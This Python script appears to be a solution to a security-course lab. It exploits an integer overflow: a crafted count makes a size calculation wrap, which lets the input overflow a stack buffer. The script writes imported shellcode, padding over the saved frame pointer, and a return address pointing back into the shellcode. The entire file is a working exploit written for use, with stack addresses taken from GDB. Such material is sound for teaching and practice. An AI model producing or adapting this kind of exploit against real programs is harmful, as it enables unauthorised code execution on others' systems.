#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
UINT_MAX = 0xFFFFFFFF

# Multiplying by 4 is like bit shift twice
count = len(shellcode) | 0xc0000000

# count * 4 overflows
buf_size = len(shellcode) * 4

# Values pulled from GDB
ebp = 0xfffeec58
buf_ptr = 0xfffeebd0

# Padding is dist between end of buffer and EBP
padding_size = ebp - (buf_ptr + buf_size)

# File must start with count
sys.stdout.buffer.write(pack("<I", count))

# Write shellcode into start of buffer
sys.stdout.buffer.write(shellcode)

# Write junk til end of buffer + til EBP + over EBP
sys.stdout.buffer.write(b"A" * (buf_size - len(shellcode)))
sys.stdout.buffer.write(b"A" * (padding_size + 4))

# Write new return address (into shellcode)
sys.stdout.buffer.write(pack("<I", buf_ptr))
